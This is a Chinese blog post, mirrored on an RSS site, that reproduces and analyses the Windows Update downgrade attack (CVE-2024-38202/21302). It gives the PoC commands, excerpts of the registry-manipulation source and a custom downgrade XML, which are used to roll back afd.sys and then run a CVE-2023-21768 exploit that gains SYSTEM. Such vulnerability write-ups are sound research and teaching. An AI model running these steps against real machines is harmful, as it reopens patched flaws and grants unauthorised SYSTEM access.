@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+  <link rel="dns-prefetch" href="//unpkg.com">
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>Windows 更新降级攻击复现与分析 - RSSBOX</title>
+
+  
+    <meta name="description" content="SafeBreach 的安全研究员 Alon Leviev 在 Black Hat 2024 上揭示了两个漏洞CVE-2024-38202 和 CVE-2024-21302 ，可用于破坏 Windows 更新的完整性并重新引入数千个以前修复的漏洞，从而将修补后的系统重新变成 0day 漏洞的目标。环境准备Windows版本：Windows 11 消费者版本 23H2（2024年6月更新）x64磁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 更新降级攻击复现与分析">
+<meta property="og:url" content="https://rssbox.mhuig.top/rss/bb92ed01.html">
+<meta property="og:site_name" content="RSSBOX">
+<meta property="og:description" content="SafeBreach 的安全研究员 Alon Leviev 在 Black Hat 2024 上揭示了两个漏洞CVE-2024-38202 和 CVE-2024-21302 ，可用于破坏 Windows 更新的完整性并重新引入数千个以前修复的漏洞，从而将修补后的系统重新变成 0day 漏洞的目标。环境准备Windows版本：Windows 11 消费者版本 23H2（2024年6月更新）x64磁">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d05fe3c3b.png">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d4265b3e8.png">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d44d44c4f.png">
+<meta property="article:published_time" content="2024-08-21T22:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T22:00:00.000Z">
+<meta property="article:author" content="MHuiG">
+<meta property="article:tag" content="友链">
+<meta property="article:tag" content="bowenyoung">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d05fe3c3b.png">
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="RSSBOX" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class="l_body" id="start">
+    <aside class="l_left" layout="post">
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" target="_blank" rel="noopener" href="https://mhuig.top/"><div class="bg" style="opacity:0;background-image:url(https://static.mhuig.top/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">RSSBOX</div><div class="sub normal cap">MHuiGのRSS订阅</div><div class="sub hover cap" style="opacity:0">rssbox.mhuig.top</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">RSS</a><a class="nav-item" target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a class="nav-item" target="_blank" rel="noopener" href="https://mhuig.top/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC-%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD"><span class="toc-text">PoC 工具下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B"><span class="toc-text">Windows 更新流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A"><span class="toc-text">更多</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB"><span class="toc-text">自定义降级攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/MHuiG" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"></a><a class="social" href="https://music.163.com/#/user/home?id=63035382" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/3845874.svg"></a><a class="social" href="/contact/" rel="noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/a1b00e20f425d.svg"></a></div></footer>
+
+    </aside>
+    <div class="l_main">
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%8F%8B%E9%93%BE/">友链</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%8F%8B%E9%93%BE/bowenyoung/">bowenyoung</a></div><div id="post-meta">发布于&nbsp;<time datetime="2024-08-21T22:00:00.000Z">2024-08-22</time></div></div>
+
+<article class="content md post">
+<h1 class="article-title"><span>Windows 更新降级攻击复现与分析</span></h1>
+<div>
+<p>SafeBreach 的安全研究员 Alon Leviev 在 Black Hat 2024 上揭示了两个漏洞CVE-2024-38202 和 CVE-2024-21302 ，可用于破坏 Windows 更新的完整性并重新引入数千个以前修复的漏洞，从而将修补后的系统重新变成 0day 漏洞的目标。</p><h2 id="环境准备"><a class="headerlink" href="#环境准备" title="环境准备"></a>环境准备</h2><p>Windows版本：Windows 11 消费者版本 23H2（2024年6月更新）x64</p><p><a href="ed2k://|file|zh-cn_windows_11_consumer_editions_version_23h2_updated_june_2024_x64_dvd_78b33b16.iso|7141826560|9BCE0FF18791A035ED8541A3EF8C791A|/">磁力连接</a></p><p>下载后导入到 VMware。</p><h2 id="PoC-工具下载"><a class="headerlink" href="#PoC-工具下载" title="PoC 工具下载"></a>PoC 工具下载</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/SafeBreach-Labs/WindowsDowndate">https://github.com/SafeBreach-Labs/WindowsDowndate</a><br>仓库中也提供了 PyInstaller 构建好的可执行程序。</p><h2 id="漏洞复现"><a class="headerlink" href="#漏洞复现" title="漏洞复现"></a>漏洞复现</h2><p>运行 <code>winver</code> 看一下版本：<code>Windows11 23H2 22631.3880</code><br><img><img alt="winver" class="lazyload" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-srcset="https://bu.dusays.com/2024/08/22/66c6d05fe3c3b.png" src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d05fe3c3b.png"></p><p>以管理员权限运行PoC程序，降级到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768">CVE-2023-21768</a> 可攻击的环境（AFD 驱动）：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./windows_downdate <span class="literal">--config-xml</span> examples/CVE<span class="literal">-2023-21768-AFD-Driver-EoP-Patch-Downgrade</span>/Config.xml</span><br></pre></td></tr></tbody></table></figure><p><img><img alt="downdate" class="lazyload" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-srcset="https://bu.dusays.com/2024/08/22/66c6d4265b3e8.png" src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d4265b3e8.png"></p><p>需要重启，重启完成后运行cmd。<br>切换到 CVE-2023-21768 利用程序目录，运行 <code>whomai</code> 可知目前是普通用户。<br>找到当前 cmd 的 pid：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | find <span class="string">"cmd.exe"</span></span><br></pre></td></tr></tbody></table></figure><p>运行 CVE-2023-21768 利用程序，指定要提升权限的进程为当前 cmd 进程：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Windows_AFD_LPE_CVE<span class="literal">-2023-21768</span>.exe &lt;pid&gt;</span><br></pre></td></tr></tbody></table></figure><p><img><img alt="exp" class="lazyload" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-srcset="https://bu.dusays.com/2024/08/22/66c6d44d44c4f.png" src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d44d44c4f.png"></p><p>再次运行 <code>whoami</code> 发现已经拿到 system 权限。</p><h2 id="漏洞分析"><a class="headerlink" href="#漏洞分析" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>我能够使完全修补的 Windows 机器容易受到数千个过去漏洞的影响，将修复的漏洞变成零日漏洞，并使“完全修补”一词在世界上任何 Windows 机器上都毫无意义。</p></blockquote><h3 id="Windows-更新流程"><a class="headerlink" href="#Windows-更新流程" title="Windows 更新流程"></a>Windows 更新流程</h3><p>首先需要知道的是，Windows 的更新需要客户端管理权限，而更新服务器会运行受信任的安装程序来完成更新。即使是 SYSTEM 权限，也不能修改 Windows 更细节机制拥有的系统文件。</p><blockquote><p>Windows 更新流程包括以下步骤：</p><ol><li>首先，客户端要求服务器执行它提供的更新文件夹中包含的更新。</li><li>然后，服务器验证更新文件夹的完整性。</li><li>验证后，服务器将对更新文件夹进行操作，以完成更新文件。它们被保存到服务器控制的文件夹中，客户端无法访问该文件夹。</li><li>服务器将操作列表保存到服务器控制的文件夹中，客户端无法访问该文件夹。操作列表名为 Pending.xml，其中包含要执行的更新操作。例如，它指定要更新的文件、源文件和目标文件等。</li><li>最后，当操作系统重启时，将对操作列表进行操作，并在重启过程中执行更新操作。</li></ol></blockquote><p>其中第5步的更新是由受信任的安装程序在服务器端强制执行的，管理员想要提权到受信任安装程序权限会被 EDR（Endpoint Detection and Response） 阻止。因此想要<strong>代替更新服务器来完成更新是不可能的</strong>。</p><p>作者一开始的目标是更新文件夹中的差异文件。但是 manifest 里硬编码了更新文件的哈希值，而更改这个值会破坏 manifest 文件的签名（在 catalog 文件中）。</p><h3 id="漏洞点"><a class="headerlink" href="#漏洞点" title="漏洞点"></a>漏洞点</h3><p>于是作者把目标放在了<strong>操作列表</strong>（pending.xml）的修改上，并发现了注册表一个名为<code>PoqexecCmdline</code>的有趣的 key，它包含了一个可以解析操作列表和操作列表路径的可执行程序。其路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\Configuration\PoqexecCmdline</code>。</p><p>而且这个 key 不是由受信任的安装程序强制执行，意味着我们可以用<strong>管理员权限</strong>来修改添加这个key并修改其值。这个 key 的作用是什么呢？它标志着<strong>需要更新</strong>，受信任安装服务在检测到这个 key 后，会将其值作为命令执行，而这个命令可以用于解析操作列表及其路径，这意味着修改这个 key 也就<strong>完全控制了操作列表</strong>。<br>源代码中定义：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_poqexec_cmd</span>(<span class="params">poqexec_cmd: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Registers the PoqexecCmdLine registry key containing the Pending.xml path</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param poqexec_cmd: The PoqExec.exe command line. Usually it is as follows -</span></span><br><span class="line"><span class="string">        path/to/poqexec.exe params pending_xml_nt_path</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    set_reg_value(winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                  SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH,</span><br><span class="line">                  <span class="string">"PoqexecCmdline"</span>,</span><br><span class="line">                  [poqexec_cmd],</span><br><span class="line">                  winreg.REG_MULTI_SZ)</span><br></pre></td></tr></tbody></table></figure><p>源代码中调用：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pend_update</span>(<span class="params">pending_xml_path: <span class="built_in">str</span>, impersonate_ti: <span class="built_in">bool</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    ...</span><br><span class="line">    poqexec_path_exp = os.path.expandvars(POQEXEC_PATH)</span><br><span class="line">    poqexec_cmd = <span class="string">f"<span class="subst">&#123;poqexec_path_exp&#125;</span> /display_progress \\??\\<span class="subst">&#123;pending_xml_path&#125;</span>"</span></span><br><span class="line">    register_poqexec_cmd(poqexec_cmd)</span><br></pre></td></tr></tbody></table></figure><p>可以发现程序生成了一行完整的<code>poqexec.exe</code>命令并将其写为了这个 key 的值，其中<code>pending_xml_path</code>也由我们控制，其相应文件中内容就是我们之前运行的命令中<code>--config-xml</code>选项后指定的 xml 文件内容。</p><p>这个xml，即操作列表（pending.xml）提供创建文件、删除文件、移动文件、硬链接文件、创建注册表键和值、删除键和值等功能。例如，为了降级，可以使用硬链接文件操作，source 文件将替换 destination：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HardlinkFile</span> <span class="attr">source</span>=<span class="string">"C:\UpdateDir\Source.exe"</span> <span class="attr">destination</span>=<span class="string">"C:\Windows\System32\Destination.exe"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>将 destination 设置为要降级的目标文件，将 source 替换为降级后的文件即可。</p><h3 id="攻击流程"><a class="headerlink" href="#攻击流程" title="攻击流程"></a>攻击流程</h3><p>攻击的主要思想就是修改操作列表。但是还需要经过一些验证/找到触发更新操作的方式，主要流程如下：</p><ol><li>将受信任安装服务设置为自启动，这样重启系统后会检查是否需要更新</li><li>在注册表中添加<code>PoqexecCmdline</code>及相应的值，<strong>指定操作列表路径</strong></li><li>添加操作列表的标识符<br>标识符是一个动态数字，出于完整性目的，将它与操作列表的标识符进行比较。从代码中可以看到，在 xml 中设置的标识符要和在注册表中 PendingXmlIdentifier 的值一样。<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PENDING_XML_IDENTIFIER = <span class="string">"916ae75edb30da0146730000dc1be027"</span></span><br><span class="line"></span><br><span class="line">EMPTY_PENDING_XML = <span class="string">f"""&lt;?xml version='1.0' encoding='utf-8'?&gt;\n</span></span><br><span class="line"><span class="string">&lt;PendingTransaction Version="3.1" WcpVersion="10.0.22621.2567 (WinBuild.160101.0800)" Identifier="<span class="subst">&#123;PENDING_XML_IDENTIFIER&#125;</span>"&gt;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">...</span><br><span class="line">set_pending_xml_identifier(PENDING_XML_IDENTIFIER)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_pending_xml_identifier</span>(<span class="params">pending_xml_identifier: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Sets the Pendning.xml identifier in registry</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param pending_xml_identifier: The Pending.xml identifier</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    :note: This API assumes the COMPONENTS hive is loaded to the registry</span></span><br><span class="line"><span class="string">    :note: If this identifier is not equal to the Pending.xml identifier, PoqExec.exe will fail parsing Pending.xml</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    pending_xml_identifier_bytes = <span class="built_in">bytes</span>(pending_xml_identifier, <span class="string">"utf-8"</span>)</span><br><span class="line">    pending_xml_identifier_unicode = <span class="string">b"\x00"</span>.join(<span class="built_in">bytes</span>([byte]) <span class="keyword">for</span> byte <span class="keyword">in</span> pending_xml_identifier_bytes) + <span class="string">b"\x00"</span></span><br><span class="line">    set_reg_value(winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                  <span class="string">"COMPONENTS"</span>,</span><br><span class="line">                  <span class="string">"PendingXmlIdentifier"</span>,</span><br><span class="line">                  pending_xml_identifier_unicode,</span><br><span class="line">                  winreg.REG_BINARY)</span><br></pre></td></tr></tbody></table></figure></li></ol><p>先前，在执行 PoC 代码后，我们重启并完成了对另一个漏洞的攻击。<br>在这个过程中：</p><ol><li>Windows 更新机制中的受信任安装服务自启动</li><li>检测到<code>PoqexecCmdline</code>，执行其中命令设置<strong>操作列表</strong>路径</li><li>受信任安装程序根据我们构建的 xml 文件进行更新，导致文件被替换成低版本脆弱文件</li><li>降级攻击完成</li></ol><p>由于这个过程被 Windows 更新机制接管，因此十分隐蔽。</p><h3 id="更多"><a class="headerlink" href="#更多" title="更多"></a>更多</h3><p>原文中还提到绕过 VBS(Virtualization-Based Security) UEFI 锁等内容，这里只对降级攻击做简单介绍，感兴趣可以看原文。</p><h2 id="自定义降级攻击"><a class="headerlink" href="#自定义降级攻击" title="自定义降级攻击"></a>自定义降级攻击</h2><blockquote><p>Windows 降级支持制作自定义降级。要制作自定义降级，你需要创建一个配置 XML 文件，然后将此配置 XML 输入工具即可。</p></blockquote><p>在 CVE-2023-21768 的攻击中，我们用到的 XML 文件如下：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">UpdateFilesList</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">UpdateFile</span> <span class="attr">source</span>=<span class="string">"%CWD%\examples\CVE-2023-21768-AFD-Driver-EoP-Patch-Downgrade\UpdateFiles\afd.sys"</span> <span class="attr">destination</span>=<span class="string">"C:\Windows\System32\Drivers\afd.sys"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">UpdateFilesList</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>原理非常简单，就是定义用于替换的文件路径和目标文件路径。<br>只要是 Windows 下与系统文件版本有关的漏洞就可以自定义降级攻击。</p><h2 id="结语"><a class="headerlink" href="#结语" title="结语"></a>结语</h2><p>Windows 对于安全边界的划分似乎总是异于常人啊。。。</p><blockquote><p>Max Severity: Important</p><p>Attack Complexity: Low</p><p>Privileges Required: Low</p><p>Exploit Code Maturity: Proof-of-Concept</p><p>Remediation Level: Unavailable</p></blockquote><p>前几条和最后一条竟能同时出现在同一则<a target="_blank" rel="external nofollow noopener noreferrer" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38202">安全公告</a>中，真乃神人也。</p>
+</div>
+
+<div>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="Windows 更新降级攻击复现与分析" href="https://blog.beacox.space/posts/windows-downgrade/" target="_blank" rel="external nofollow noopener noreferrer"><div class="left"><span class="title">Windows 更新降级攻击复现与分析</span><span class="desc fs12">https://blog.beacox.space/posts/windows-downgrade/</span></div><div class="right"><div class="lazy img" data-bg="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/link/8f277b4ee0ecd.svg"></div></div></a></div>
+</div>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/rss/a14edcac.html">CVE-2023-35720 华硕路由器SQL注入漏洞分析<span class="note">较早</span></a><div class="line"></div><a id="prev" href="/rss/7641a01e.html">记一次被渗透测试<span class="note">较新</span></a></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class="header">
+      <div class="title cap theme">您可能感兴趣的文章</div>
+    </section>
+    <section class="body">
+    <div class="related-posts"><a class="item" href="/rss/a14edcac.html" title="CVE-2023-35720 华硕路由器SQL注入漏洞分析"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/16/66bf4e8550197.png"></div><span class="title">CVE-2023-35720 华硕路由器SQL注入漏洞分析</span></a><a class="item" href="/rss/84e43ba7.html" title="EOVS——企业运营仿真赛参赛记录"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/01/11/63beacf2cef5d.png"></div><span class="title">EOVS——企业运营仿真赛参赛记录</span></a><a class="item" href="/rss/9fc895a5.html" title="GTK应用开发小记"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/12/64ae07efdadeb.png"></div><span class="title">GTK应用开发小记</span></a><a class="item" href="/rss/1a8a57e4.html" title="TBTL CTF 2024 WriteUp"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/05/13/6641b5128b62e.png"></div><span class="title">TBTL CTF 2024 WriteUp</span></a><a class="item" href="/rss/18c9a5eb.html" title="TINY Scanner开发文档"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://github.githubassets.com/favicons/favicon.svg"></div><span class="title">TINY Scanner开发文档</span></a><a class="item" href="/rss/73a5cbdc.html" title="UIUCTF 2024 PWN Writeup"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/07/06/6689647325ffb.png"></div><span class="title">UIUCTF 2024 PWN Writeup</span></a><a class="item" href="/rss/6aa45fe.html" title="Windows PEB 利用"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/03/16/65f56cd47e02d.png"></div><span class="title">Windows PEB 利用</span></a><a class="item" href="/rss/1275743e.html" title="《山河旅探》(Murders on the Yangtze River) 通关简评"><div class="img"><img class="lazy" 